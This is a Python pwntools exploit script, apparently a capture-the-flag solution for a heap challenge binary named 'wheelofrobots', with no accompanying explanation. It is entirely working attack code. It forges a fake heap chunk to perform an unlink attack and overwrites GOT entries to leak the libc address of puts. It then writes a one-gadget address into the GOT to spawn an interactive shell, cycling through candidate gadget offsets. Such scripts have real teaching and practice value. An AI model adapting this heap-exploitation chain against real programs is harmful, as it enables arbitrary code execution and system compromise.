from pwn import *
target=process('./wheelofrobots')
elf=ELF('./wheelofrobots')
libc=elf.libc
gadgets=[0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
for gadget in gadgets:
	def init(option,OPTION):
		print(target.recvuntil("choice : "))
		target.sendline(str(option))
		print(target.recvuntil("choice :"))
		target.sendline(OPTION)

	def add(OPTION,sizeoption=-1,trigger=""):
		init(1,str(OPTION)+trigger)
		if(sizeoption<>-1):
			print(target.recv())
			target.sendline(str(sizeoption))

	def free(OPTION):
		init(2,str(OPTION))
			
	def rename(OPTION,name):
		init(3,str(OPTION))
		print(target.recvline())
		target.send(name)

	def wheel():
		print(target.recvuntil("choice : "))
		target.sendline(str(4))
		print(target.recvlines(20))
	
	add(2,2)
	add(4)
	free(2)
	add(5,trigger="aaa")
	free(2)
	add(2,2)
	c2=0x6030f0
	fake=p64(0)+p64(0x20)+p64(c2-0x18)+p64(c2-0x10)+p64(0x20)
	rename(2,fake)
	free(4)
	freegot=0x603018
	putsgot=0x603028
	putsplt=0x400830

	rename(2,"A"*8+p64(freegot)+p64(putsgot)+p64(0x603110)+p64(putsgot))
	rename(2,p32(0)+p32(1)+p32(1)+p32(1)+p64(1)+p64(1)+p64(1))
	rename(4,p64(putsplt)+"\n")
	print(target.recvuntil("choice : "))
	target.sendline(str(2))
	print(target.recvuntil("choice :"))
	target.sendline("6")
	libc_puts=u64(target.recvline().strip("\n").ljust(8,"\x00"))
	libc_base=libc_puts-libc.symbols["puts"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	rename(1,p64(libc_gadget))

	target.interactive()

	
